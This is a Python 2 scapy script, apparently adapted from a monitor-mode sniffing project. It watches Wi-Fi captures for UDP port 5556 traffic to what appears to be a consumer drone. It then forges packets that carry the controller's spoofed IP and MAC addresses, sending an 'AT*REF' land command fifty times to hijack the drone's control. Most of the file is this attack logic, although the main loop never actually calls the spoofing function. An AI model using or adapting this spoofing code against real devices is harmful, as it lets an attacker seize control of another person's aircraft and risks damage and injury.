#! /usr/bin/env python

# modified from: https://github.com/diogomonica/py-cookieJsInjection/blob/master/OSx10.6_monitorMode.py

import os, time, sys
from subprocess import *
from scapy.all import *
from scapy.layers import *
import threading

SLEEP_TIME = 1 # Number of seconds to sniff (update frequency)

class PacketScanner(threading.Thread):
    def run(self):
        try:
            path="/tmp/"
            dirList=os.listdir(path)
            for fileName in dirList:
                if "airportSniff" in fileName:
                    try:
                        # sniff(iface='')
                        sniff(offline=path+fileName,filter="udp port 5556",prn=lambda x: x.show())
                    except NameError:
                        print "[-] No data found on pcap"
                        pass
                    os.remove(path+fileName)
        except:
            # scapy has bad errors sometimes due to multithreading
            pass # just let thread die

def parsePacket(pkt):
    try:
        if 'UDP' in pkt and pkt.dport == 5556: # read packet meant for drone
            pkt.show()

            addresses = [] # get all the addresses in 802.11 header
            if pkt.addr1:
                addresses.append(pkt.addr1)
            if pkt.addr2:
                addresses.append(pkt.addr2)
            if pkt.addr3:
                addresses.append(pkt.addr3)

            if len(addresses) < 2: # only one address means prob invalid packet
                return

            pkt = pkt.getlayer(1) # remove top layer

            spoofed_ip = pkt.src

            new_seqno = 1 # 1 always resets seqno
            land_cmd = "AT*REF=%d,0\r" % new_seqno # accepts any seqno higher than old

            for addr in addresses:
                spoofed_pkt = Ether(src=addr)/IP(src=spoofed_ip, dst='192.168.1.1')/UDP(dport=5556)/land_cmd
                for i in xrange(50):
                    send(spoofed_pkt)

    except (AttributeError, Exception) as e:
        print sys.exc_info()[0]
        # pkt could not have attributes we are expecting
        return

def getSeqno(pkt):
    try:
        load = pkt.load
        # command format is AT*[command name]=[seqno][*args]<LF>
        seqno = load[load.find('=') + 1:load.find(',')]
        return int(seqno)
    except (AttributeError, ValueError, Exception) as e:
        # pkt could not have load attribute
        # seqno could not be valid int
        return


def isRoot():
    """Verifies if the current user is root"""
    return os.getuid() & os.getgid() == 0

def printUsage():
    print "Please specify channel as well, i.e. 6"
    print "Usage: %s CHANNEL" % sys.argv[0]

if __name__ == "__main__":
    # if len(sys.argv) < 2:
    #     printUsage()
    #     sys.exit(0)

    # channel = sys.argv[1]

    if not isRoot():
        print "[-] Your have to be root to put airport into monitor mode"
        sys.exit(0)

    # print "[*] Starting scan on channel %s" % channel

    while(True):
        t = PacketScanner()
        t.setDaemon(True)
        t.start()






